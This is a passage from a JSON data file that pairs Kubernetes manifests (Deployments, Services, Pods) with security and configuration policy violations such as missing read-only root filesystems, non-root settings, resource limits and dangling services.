    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: templatebot\n  labels:\n    app: templatebot\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: templatebot\n  template:\n    metadata:\n      labels:\n        app: templatebot\n    spec:\n      containers:\n      - name: templatebot-app\n        env:\n        - name: TEMPLATEBOT_GITHUB_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: templatebot\n              key: TEMPLATEBOT_GITHUB_TOKEN\n        - name: TEMPLATEBOT_GITHUB_USER\n          valueFrom:\n            secretKeyRef:\n              name: templatebot\n              key: TEMPLATEBOT_GITHUB_USER\n        - name: SLACK_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: templatebot\n              key: SLACK_TOKEN\n        volumeMounts:\n        - name: client-tls\n          mountPath: /var/strimzi-client\n          readOnly: true\n        - name: broker-tls\n          mountPath: /var/strimzi-broker\n          readOnly: true\n      volumes:\n      - name: client-tls\n        secret:\n          secretName: kafkauser-templatebot\n      - name: broker-tls\n        secret:\n          secretName: events-cluster-ca-cert\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 2 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "9760",
    "manifest_path": "data/manifests/the_stack_sample/sample_3734.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: templatebot\n  labels:\n    app: templatebot\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: templatebot\n  template:\n    metadata:\n      labels:\n        app: templatebot\n    spec:\n      containers:\n      - name: templatebot-app\n        env:\n        - name: TEMPLATEBOT_GITHUB_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: templatebot\n              key: TEMPLATEBOT_GITHUB_TOKEN\n        - name: TEMPLATEBOT_GITHUB_USER\n          valueFrom:\n            secretKeyRef:\n              name: templatebot\n              key: TEMPLATEBOT_GITHUB_USER\n        - name: SLACK_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: templatebot\n              key: SLACK_TOKEN\n        volumeMounts:\n        - name: client-tls\n          mountPath: /var/strimzi-client\n          readOnly: true\n        - name: broker-tls\n          mountPath: /var/strimzi-broker\n          readOnly: true\n      volumes:\n      - name: client-tls\n        secret:\n          secretName: kafkauser-templatebot\n      - name: broker-tls\n        secret:\n          secretName: events-cluster-ca-cert\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"templatebot-app\" does not have a read-only root file system"
  },
  {
    "id": "9761",
    "manifest_path": "data/manifests/the_stack_sample/sample_3734.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: templatebot\n  labels:\n    app: templatebot\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: templatebot\n  template:\n    metadata:\n      labels:\n        app: templatebot\n    spec:\n      containers:\n      - name: templatebot-app\n        env:\n        - name: TEMPLATEBOT_GITHUB_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: templatebot\n              key: TEMPLATEBOT_GITHUB_TOKEN\n        - name: TEMPLATEBOT_GITHUB_USER\n          valueFrom:\n            secretKeyRef:\n              name: templatebot\n              key: TEMPLATEBOT_GITHUB_USER\n        - name: SLACK_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: templatebot\n              key: SLACK_TOKEN\n        volumeMounts:\n        - name: client-tls\n          mountPath: /var/strimzi-client\n          readOnly: true\n        - name: broker-tls\n          mountPath: /var/strimzi-broker\n          readOnly: true\n      volumes:\n      - name: client-tls\n        secret:\n          secretName: kafkauser-templatebot\n      - name: broker-tls\n        secret:\n          secretName: events-cluster-ca-cert\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"templatebot-app\" is not set to runAsNonRoot"
  },
  {
    "id": "9762",
    "manifest_path": "data/manifests/the_stack_sample/sample_3734.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: templatebot\n  labels:\n    app: templatebot\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: templatebot\n  template:\n    metadata:\n      labels:\n        app: templatebot\n    spec:\n      containers:\n      - name: templatebot-app\n        env:\n        - name: TEMPLATEBOT_GITHUB_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: templatebot\n              key: TEMPLATEBOT_GITHUB_TOKEN\n        - name: TEMPLATEBOT_GITHUB_USER\n          valueFrom:\n            secretKeyRef:\n              name: templatebot\n              key: TEMPLATEBOT_GITHUB_USER\n        - name: SLACK_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: templatebot\n              key: SLACK_TOKEN\n        volumeMounts:\n        - name: client-tls\n          mountPath: /var/strimzi-client\n          readOnly: true\n        - name: broker-tls\n          mountPath: /var/strimzi-broker\n          readOnly: true\n      volumes:\n      - name: client-tls\n        secret:\n          secretName: kafkauser-templatebot\n      - name: broker-tls\n        secret:\n          secretName: events-cluster-ca-cert\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"templatebot-app\" has cpu request 0"
  },
  {
    "id": "9763",
    "manifest_path": "data/manifests/the_stack_sample/sample_3734.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: templatebot\n  labels:\n    app: templatebot\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: templatebot\n  template:\n    metadata:\n      labels:\n        app: templatebot\n    spec:\n      containers:\n      - name: templatebot-app\n        env:\n        - name: TEMPLATEBOT_GITHUB_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: templatebot\n              key: TEMPLATEBOT_GITHUB_TOKEN\n        - name: TEMPLATEBOT_GITHUB_USER\n          valueFrom:\n            secretKeyRef:\n              name: templatebot\n              key: TEMPLATEBOT_GITHUB_USER\n        - name: SLACK_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: templatebot\n              key: SLACK_TOKEN\n        volumeMounts:\n        - name: client-tls\n          mountPath: /var/strimzi-client\n          readOnly: true\n        - name: broker-tls\n          mountPath: /var/strimzi-broker\n          readOnly: true\n      volumes:\n      - name: client-tls\n        secret:\n          secretName: kafkauser-templatebot\n      - name: broker-tls\n        secret:\n          secretName: events-cluster-ca-cert\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"templatebot-app\" has memory limit 0"
  },
  {
    "id": "9764",
    "manifest_path": "data/manifests/the_stack_sample/sample_3737.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: admission-controller\n  namespace: alameda\n  labels:\n    app: alameda\n    component: admission-controller\nspec:\n  ports:\n  - port: 443\n    targetPort: 8000\n  selector:\n    app: alameda\n    component: admission-controller\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:alameda component:admission-controller])"
  },
  {
    "id": "9765",
    "manifest_path": "data/manifests/the_stack_sample/sample_3741.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: server-deployment\nspec:\n  type: LoadBalancer\n  selector:\n    component: server-deployment\n  ports:\n  - port: 5000\n    targetPort: 5000\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[component:server-deployment])"
  },
  {
    "id": "9766",
    "manifest_path": "data/manifests/the_stack_sample/sample_3742.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: imgclass\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: imageclassifier\n  template:\n    metadata:\n      labels:\n        app: imageclassifier\n    spec:\n      containers:\n      - name: cv-app\n        image: gcr.io/srivatsan-project/imgwebapp:v1\n        ports:\n        - containerPort: 8501\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 2 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "9767",
    "manifest_path": "data/manifests/the_stack_sample/sample_3742.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: imgclass\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: imageclassifier\n  template:\n    metadata:\n      labels:\n        app: imageclassifier\n    spec:\n      containers:\n      - name: cv-app\n        image: gcr.io/srivatsan-project/imgwebapp:v1\n        ports:\n        - containerPort: 8501\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"cv-app\" does not have a read-only root file system"
  },
  {
    "id": "9768",
    "manifest_path": "data/manifests/the_stack_sample/sample_3742.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: imgclass\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: imageclassifier\n  template:\n    metadata:\n      labels:\n        app: imageclassifier\n    spec:\n      containers:\n      - name: cv-app\n        image: gcr.io/srivatsan-project/imgwebapp:v1\n        ports:\n        - containerPort: 8501\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"cv-app\" is not set to runAsNonRoot"
  },
  {
    "id": "9769",
    "manifest_path": "data/manifests/the_stack_sample/sample_3742.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: imgclass\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: imageclassifier\n  template:\n    metadata:\n      labels:\n        app: imageclassifier\n    spec:\n      containers:\n      - name: cv-app\n        image: gcr.io/srivatsan-project/imgwebapp:v1\n        ports:\n        - containerPort: 8501\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"cv-app\" has cpu request 0"
  },
  {
    "id": "9770",
    "manifest_path": "data/manifests/the_stack_sample/sample_3742.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: imgclass\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: imageclassifier\n  template:\n    metadata:\n      labels:\n        app: imageclassifier\n    spec:\n      containers:\n      - name: cv-app\n        image: gcr.io/srivatsan-project/imgwebapp:v1\n        ports:\n        - containerPort: 8501\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"cv-app\" has memory limit 0"
  },
  {
    "id": "9771",
    "manifest_path": "data/manifests/the_stack_sample/sample_3744.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: nginx-frontend\n  namespace: tenant-a\n  labels:\n    app: nginx\n    romana.io/segment: frontend\nspec:\n  containers:\n  - name: nginx\n    image: rstarmer/nginx-curl\n    ports:\n    - containerPort: 80\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"rstarmer/nginx-curl\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "9772",
    "manifest_path": "data/manifests/the_stack_sample/sample_3744.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: nginx-frontend\n  namespace: tenant-a\n  labels:\n    app: nginx\n    romana.io/segment: frontend\nspec:\n  containers:\n  - name: nginx\n    image: rstarmer/nginx-curl\n    ports:\n    - containerPort: 80\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "9773",
    "manifest_path": "data/manifests/the_stack_sample/sample_3744.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: nginx-frontend\n  namespace: tenant-a\n  labels:\n    app: nginx\n    romana.io/segment: frontend\nspec:\n  containers:\n  - name: nginx\n    image: rstarmer/nginx-curl\n    ports:\n    - containerPort: 80\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "9774",
    "manifest_path": "data/manifests/the_stack_sample/sample_3744.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: nginx-frontend\n  namespace: tenant-a\n  labels:\n    app: nginx\n    romana.io/segment: frontend\nspec:\n  containers:\n  - name: nginx\n    image: rstarmer/nginx-curl\n    ports:\n    - containerPort: 80\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "9775",
    "manifest_path": "data/manifests/the_stack_sample/sample_3744.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: nginx-frontend\n  namespace: tenant-a\n  labels:\n    app: nginx\n    romana.io/segment: frontend\nspec:\n  containers:\n  - name: nginx\n    image: rstarmer/nginx-curl\n    ports:\n    - containerPort: 80\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "9776",
    "manifest_path": "data/manifests/the_stack_sample/sample_3746.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: curl-pod\nspec:\n  containers:\n  - name: curl\n    image: curlimages/curl:7.77.0\n    command:\n    - /bin/sh\n    - -c\n    - --\n    args:\n    - while true; do sleep 30; done;\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"curl\" does not have a read-only root file system"
  },
  {
    "id": "9777",
    "manifest_path": "data/manifests/the_stack_sample/sample_3746.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: curl-pod\nspec:\n  containers:\n  - name: curl\n    image: curlimages/curl:7.77.0\n    command:\n    - /bin/sh\n    - -c\n    - --\n    args:\n    - while true; do sleep 30; done;\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"curl\" is not set to runAsNonRoot"
  },
  {
    "id": "9778",
    "manifest_path": "data/manifests/the_stack_sample/sample_3746.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: curl-pod\nspec:\n  containers:\n  - name: curl\n    image: curlimages/curl:7.77.0\n    command:\n    - /bin/sh\n    - -c\n    - --\n    args:\n    - while true; do sleep 30; done;\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"curl\" has cpu request 0"
  },
  {
    "id": "9779",
    "manifest_path": "data/manifests/the_stack_sample/sample_3746.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: curl-pod\nspec:\n  containers:\n  - name: curl\n    image: curlimages/curl:7.77.0\n    command:\n    - /bin/sh\n    - -c\n    - --\n    args:\n    - while true; do sleep 30; done;\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"curl\" has memory limit 0"
  },
  {
    "id": "9780",
    "manifest_path": "data/manifests/the_stack_sample/sample_3748.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: zwave\nspec:\n  type: NodePort\n  ports:\n  - name: http\n    port: 8091\n    targetPort: http\n  - name: ws\n    port: 3000\n    targetPort: ws\n  selector:\n    name: zwave\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[name:zwave])"
  },
  {
    "id": "9781",
    "manifest_path": "data/manifests/the_stack_sample/sample_3749.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: loadgenerator\nspec:\n  selector:\n    matchLabels:\n      app: loadgenerator\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: loadgenerator\n      annotations:\n        sidecar.istio.io/rewriteAppHTTPProbers: 'true'\n    spec:\n      serviceAccountName: default\n      containers:\n      - name: loadgenerator\n        image: gcr.io/bank-of-anthos/loadgenerator:v0.4.2\n        env:\n        - name: FRONTEND_ADDR\n          value: frontend:80\n        - name: USERS\n          value: '5'\n        - name: LOG_LEVEL\n          value: error\n        resources:\n          requests:\n            cpu: 100m\n            memory: 512Mi\n          limits:\n            cpu: 500m\n            memory: 1Gi\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"loadgenerator\" does not have a read-only root file system"
  },
  {
    "id": "9782",
    "manifest_path": "data/manifests/the_stack_sample/sample_3749.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: loadgenerator\nspec:\n  selector:\n    matchLabels:\n      app: loadgenerator\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: loadgenerator\n      annotations:\n        sidecar.istio.io/rewriteAppHTTPProbers: 'true'\n    spec:\n      serviceAccountName: default\n      containers:\n      - name: loadgenerator\n        image: gcr.io/bank-of-anthos/loadgenerator:v0.4.2\n        env:\n        - name: FRONTEND_ADDR\n          value: frontend:80\n        - name: USERS\n          value: '5'\n        - name: LOG_LEVEL\n          value: error\n        resources:\n          requests:\n            cpu: 100m\n            memory: 512Mi\n          limits:\n            cpu: 500m\n            memory: 1Gi\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"loadgenerator\" is not set to runAsNonRoot"
  },
  {
    "id": "9783",
    "manifest_path": "data/manifests/the_stack_sample/sample_3750.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: poi-svc\nspec:\n  ports:\n  - port: 80\n    targetPort: 80\n    protocol: TCP\n  selector:\n    app: azure-poi\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:azure-poi])"
  },
  {
    "id": "9784",
    "manifest_path": "data/manifests/the_stack_sample/sample_3752.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: squash-api\n  labels:\n    app: squash\nspec:\n  selector:\n    app: squash\n    tier: api\n  ports:\n  - protocol: TCP\n    port: 443\n    targetPort: 443\n  type: LoadBalancer\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:squash tier:api])"
  },
  {
    "id": "9785",
    "manifest_path": "data/manifests/the_stack_sample/sample_3753.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-4827\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "9786",
    "manifest_path": "data/manifests/the_stack_sample/sample_3753.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-4827\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "9787",
    "manifest_path": "data/manifests/the_stack_sample/sample_3753.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-4827\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "9788",
    "manifest_path": "data/manifests/the_stack_sample/sample_3753.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-4827\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "9789",
    "manifest_path": "data/manifests/the_stack_sample/sample_3753.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-4827\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "9790",
    "manifest_path": "data/manifests/the_stack_sample/sample_3755.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: mlir-nvidia-production\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: mlir-nvidia-production\n  template:\n    metadata:\n      labels:\n        app: mlir-nvidia-production\n    spec:\n      containers:\n      - image: gcr.io/sanitizer-bots/buildbot-mlir-nvidia:14\n        name: mlir-nvidia-production\n        env:\n        - name: BUILDBOT_PORT\n          value: '9990'\n        resources:\n          limits:\n            cpu: '15'\n            memory: 10Gi\n            nvidia.com/gpu: '1'\n          requests:\n            cpu: '15'\n            memory: 10Gi\n            nvidia.com/gpu: '1'\n        volumeMounts:\n        - mountPath: /secrets\n          mountPropagation: None\n          name: buildbot-token\n      volumes:\n      - name: buildbot-token\n        secret:\n          optional: false\n          secretName: password-mlir-nvidia\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"mlir-nvidia-production\" does not have a read-only root file system"
  },
  {
    "id": "9791",
    "manifest_path": "data/manifests/the_stack_sample/sample_3755.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: mlir-nvidia-production\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: mlir-nvidia-production\n  template:\n    metadata:\n      labels:\n        app: mlir-nvidia-production\n    spec:\n      containers:\n      - image: gcr.io/sanitizer-bots/buildbot-mlir-nvidia:14\n        name: mlir-nvidia-production\n        env:\n        - name: BUILDBOT_PORT\n          value: '9990'\n        resources:\n          limits:\n            cpu: '15'\n            memory: 10Gi\n            nvidia.com/gpu: '1'\n          requests:\n            cpu: '15'\n            memory: 10Gi\n            nvidia.com/gpu: '1'\n        volumeMounts:\n        - mountPath: /secrets\n          mountPropagation: None\n          name: buildbot-token\n      volumes:\n      - name: buildbot-token\n        secret:\n          optional: false\n          secretName: password-mlir-nvidia\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"mlir-nvidia-production\" is not set to runAsNonRoot"
  },
  {
    "id": "9792",
    "manifest_path": "data/manifests/the_stack_sample/sample_3757.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: apache-svc\nspec:\n  selector:\n    app: httpd\n  ports:\n  - protocol: TCP\n    port: 80\n    targetPort: 80\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:httpd])"
  },
  {
    "id": "9793",
    "manifest_path": "data/manifests/the_stack_sample/sample_3758.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: mysql-service\n  labels:\n    app: mysql-service\n    role: master\nspec:\n  ports:\n  - port: 3306\n  selector:\n    app: mysql-server\n    tier: db\n  clusterIP: None\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:mysql-server tier:db])"
  },
  {
    "id": "9794",
    "manifest_path": "data/manifests/the_stack_sample/sample_3763.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  labels:\n    app.kubernetes.io/component: ghost\n    app.kubernetes.io/instance: RELEASE-NAME\n    app.kubernetes.io/managed-by: Helm\n    app.kubernetes.io/name: ghost\n    helm.sh/chart: ghost-16.0.4\n  name: RELEASE-NAME-ghost\n  namespace: default\nspec:\n  ports:\n  - name: http\n    port: 80\n    protocol: TCP\n    targetPort: http\n  selector:\n    app.kubernetes.io/component: ghost\n    app.kubernetes.io/instance: RELEASE-NAME\n    app.kubernetes.io/name: ghost\n  sessionAffinity: None\n  type: LoadBalancer\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app.kubernetes.io/component:ghost app.kubernetes.io/instance:RELEASE-NAME app.kubernetes.io/name:ghost])"
  },
  {
    "id": "9795",
    "manifest_path": "data/manifests/the_stack_sample/sample_3764.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: myapp\n  namespace: elk\nspec:\n  selector:\n    matchLabels:\n      app: myapp\n  template:\n    metadata:\n      labels:\n        app: myapp\n    spec:\n      containers:\n      - name: myapp\n        image: rishiray/springboot-app:${GIT_COMMIT}\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 8080\n        env:\n        - name: MONGODB_HOST\n          value: mongodb-1.mongodb\n        - name: MONGODB_PORT\n          value: '27017'\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"myapp\" does not have a read-only root file system"
  },
  {
    "id": "9796",
    "manifest_path": "data/manifests/the_stack_sample/sample_3764.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: myapp\n  namespace: elk\nspec:\n  selector:\n    matchLabels:\n      app: myapp\n  template:\n    metadata:\n      labels:\n        app: myapp\n    spec:\n      containers:\n      - name: myapp\n        image: rishiray/springboot-app:${GIT_COMMIT}\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 8080\n        env:\n        - name: MONGODB_HOST\n          value: mongodb-1.mongodb\n        - name: MONGODB_PORT\n          value: '27017'\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"myapp\" is not set to runAsNonRoot"
  },
  {
    "id": "9797",
    "manifest_path": "data/manifests/the_stack_sample/sample_3764.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: myapp\n  namespace: elk\nspec:\n  selector:\n    matchLabels:\n      app: myapp\n  template:\n    metadata:\n      labels:\n        app: myapp\n    spec:\n      containers:\n      - name: myapp\n        image: rishiray/springboot-app:${GIT_COMMIT}\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 8080\n        env:\n        - name: MONGODB_HOST\n          value: mongodb-1.mongodb\n        - name: MONGODB_PORT\n          value: '27017'\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"myapp\" has cpu request 0"
  },
  {
    "id": "9798",
    "manifest_path": "data/manifests/the_stack_sample/sample_3764.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: myapp\n  namespace: elk\nspec:\n  selector:\n    matchLabels:\n      app: myapp\n  template:\n    metadata:\n      labels:\n        app: myapp\n    spec:\n      containers:\n      - name: myapp\n        image: rishiray/springboot-app:${GIT_COMMIT}\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 8080\n        env:\n        - name: MONGODB_HOST\n          value: mongodb-1.mongodb\n        - name: MONGODB_PORT\n          value: '27017'\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"myapp\" has memory limit 0"
  },
  {
    "id": "9799",
    "manifest_path": "data/manifests/the_stack_sample/sample_3765.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: api-load-balancer-service\nspec:\n  type: LoadBalancer\n  selector:\n    component: api\n  ports:\n  - port: 3000\n    targetPort: 3000\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[component:api])"
  },
  {
    "id": "9800",
    "manifest_path": "data/manifests/the_stack_sample/sample_3766.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: kpack-controller\n  namespace: kpack\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: kpack-controller\n  template:\n    metadata:\n      labels:\n        app: kpack-controller\n        version: 0.0.6-rc.45\n    spec:\n      serviceAccountName: controller\n      containers:\n      - name: controller\n        image: gcr.io/cf-build-service-public/kpack/controller@sha256:febeb4b845a3d908c8a77dcbefb4bb30345a43d9b66ad63f7fa78eb54e584b5d\n        env:\n        - name: BUILD_INIT_IMAGE\n          value: gcr.io/cf-build-service-public/kpack/build-init@sha256:5205844aefba7c91803198ef81da9134031f637d605d293dfe4531c622aa42b1\n        - name: REBASE_IMAGE\n          value: gcr.io/cf-build-service-public/kpack/rebase@sha256:fbc2a6bf5c535b44e6da45cd13de3b09880b0e8ccf7d5022f568065eccf5efee\n        - name: COMPLETION_IMAGE\n          value: gcr.io/cf-build-service-public/kpack/completion@sha256:35ea89f438450d6f322af0b24a1ca48031788c98e15c0d3c45aa26999bc1e34b\n        - name: LIFECYCLE_IMAGE\n          value: gcr.io/cf-build-service-public/kpack/lifecycle@sha256:31a73391d4bf8b919fc2a15455ba0844fed109f935c43cd3e97e0d1e16662d74\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"controller\" does not have a read-only root file system"
  },
  {
    "id": "9801",
    "manifest_path": "data/manifests/the_stack_sample/sample_3766.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: kpack-controller\n  namespace: kpack\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: kpack-controller\n  template:\n    metadata:\n      labels:\n        app: kpack-controller\n        version: 0.0.6-rc.45\n    spec:\n      serviceAccountName: controller\n      containers:\n      - name: controller\n        image: gcr.io/cf-build-service-public/kpack/controller@sha256:febeb4b845a3d908c8a77dcbefb4bb30345a43d9b66ad63f7fa78eb54e584b5d\n        env:\n        - name: BUILD_INIT_IMAGE\n          value: gcr.io/cf-build-service-public/kpack/build-init@sha256:5205844aefba7c91803198ef81da9134031f637d605d293dfe4531c622aa42b1\n        - name: REBASE_IMAGE\n          value: gcr.io/cf-build-service-public/kpack/rebase@sha256:fbc2a6bf5c535b44e6da45cd13de3b09880b0e8ccf7d5022f568065eccf5efee\n        - name: COMPLETION_IMAGE\n          value: gcr.io/cf-build-service-public/kpack/completion@sha256:35ea89f438450d6f322af0b24a1ca48031788c98e15c0d3c45aa26999bc1e34b\n        - name: LIFECYCLE_IMAGE\n          value: gcr.io/cf-build-service-public/kpack/lifecycle@sha256:31a73391d4bf8b919fc2a15455ba0844fed109f935c43cd3e97e0d1e16662d74\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"controller\" not found"
  },
  {
    "id": "9802",
    "manifest_path": "data/manifests/the_stack_sample/sample_3766.yaml",
